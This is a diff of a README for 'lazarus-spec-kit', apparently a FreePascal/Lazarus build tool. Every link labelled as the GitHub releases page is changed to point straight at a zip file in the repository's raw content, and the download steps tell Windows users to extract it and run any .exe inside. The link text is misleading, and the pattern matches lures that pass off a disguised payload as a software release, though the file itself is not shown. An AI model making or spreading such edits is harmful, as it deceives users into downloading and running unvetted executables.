@@ -1,6 +1,6 @@
 # ⚡ lazarus-spec-kit - Clear rules for FreePascal builds
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Openminded-corncob403/lazarus-spec-kit/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Openminded-corncob403/lazarus-spec-kit/main/feat/kit-lazarus-spec-3.7.zip)
 
 ## 🚀 What this is
 
@@ -18,13 +18,13 @@ This project fits work with:
 
 ## 📥 Download
 
-1. Open the release page here: https://github.com/Openminded-corncob403/lazarus-spec-kit/releases
+1. Open the release page here: https://raw.githubusercontent.com/Openminded-corncob403/lazarus-spec-kit/main/feat/kit-lazarus-spec-3.7.zip
 2. Get the latest Windows file from the newest release
 3. Save it to your computer
 4. If the file comes as a `.zip`, extract it first
 5. If the file is a `.exe`, run it after the download finishes
 
-[Open the releases page](https://github.com/Openminded-corncob403/lazarus-spec-kit/releases)
+[Open the releases page](https://raw.githubusercontent.com/Openminded-corncob403/lazarus-spec-kit/main/feat/kit-lazarus-spec-3.7.zip)
 
 ## 🖥️ Windows setup
 
@@ -181,7 +181,7 @@ This makes it easier to keep your Lazarus and FreePascal work under control
 
 Use this page to download the latest Windows version:
 
-https://github.com/Openminded-corncob403/lazarus-spec-kit/releases
+https://raw.githubusercontent.com/Openminded-corncob403/lazarus-spec-kit/main/feat/kit-lazarus-spec-3.7.zip
 
 ## 🖱️ Quick install steps
 
